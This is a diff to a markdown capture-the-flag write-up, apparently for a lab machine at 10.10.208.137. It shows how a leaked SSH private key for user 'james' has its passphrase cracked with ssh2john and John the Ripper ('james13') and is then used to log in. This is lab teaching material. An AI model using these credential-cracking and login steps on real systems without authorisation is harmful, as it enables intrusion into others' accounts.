@@ -91,10 +91,14 @@ hit fresh on the page!
 ```
 It worked! We're now presented with an SSH private key for james (from paradox). Let's see if we can SSH in.
 
+```bash
+<create a file called id_rsa and paste in the contents from the page>
+chmod 600 id_rsa
+ssh -i id_rsa james@10.10.208.137
+```
+
 **Results:**
 ```
-chmod 600 id_rsa
-sh -i id_rsa james@10.10.208.137
 The authenticity of host '10.10.208.137 (10.10.208.137)' can't be established.
 ED25519 key fingerprint is SHA256:FhrAF0Rj+EFV1XGZSYeJWf5nYG0wSWkkEGSO5b+oSHk.
 This key is not known by any other names.
@@ -103,7 +107,7 @@ Warning: Permanently added '10.10.208.137' (ED25519) to the list of known hosts.
 Enter passphrase for key 'id_rsa': 
 ```
 
-Nope it has a passphrase. That can easily be done with John the ripper
+Nope it has a passphrase. That can easily be cracked with John the ripper
 
 ```bash
 ssh2john id_rsa > john_rsa
@@ -123,7 +127,7 @@ james13          (id_rsa)
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 ```
-
+so his ssh private key has a passphrase of "james13"
 ```bash
 ssh -i id_rsa james@10.10.208.137
 ```
